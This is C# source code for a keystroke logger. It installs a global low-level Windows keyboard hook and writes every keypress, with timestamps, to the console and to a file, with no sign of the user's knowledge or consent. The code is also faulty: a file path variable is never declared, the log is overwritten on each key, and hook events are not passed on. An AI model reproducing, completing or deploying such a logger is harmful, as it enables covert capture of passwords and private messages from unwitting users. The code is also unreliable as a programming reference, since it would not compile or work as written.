using System;
using System.IO;
using System.Text;
using System.Management;
using System.Data.OleDb;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace KeyboardHookListener {
  class Program {
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
    public static event KeyEventHandler KeyDown;

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
      
      int vkCode = Marshal.ReadInt32(lParam);
      
      var key = (Keys) vkCode;
      
      string currentLog = DateTime.Now.ToString("HH:mm:ss.fff") + ": " + key;

      if (nCode >= 0 && wParam == (IntPtr) 0x0100) {
        
        if (KeyDown != null) {
          KeyDown(null, new KeyEventArgs(key));
        }

        Console.WriteLine(currentLog);

        if (!File.Exists(currentPath)) {
          string createText = currentLog + Environment.NewLine;
          File.Create(currentPath).Close();
        }

        using(var streamWriter = new StreamWriter(currentPath)) {
          streamWriter.WriteLine(currentLog);
        }
        
      }
      return IntPtr.Zero;
    }

    static void Main(string[] args) {
      Process currentProcess = Process.GetCurrentProcess();
      ProcessModule curModule = currentProcess.MainModule;
      SetWindowsHookEx(13, (HookProc) HookCallback, GetModuleHandle(curModule.ModuleName), 0);
      Application.Run();
    }
  }
}
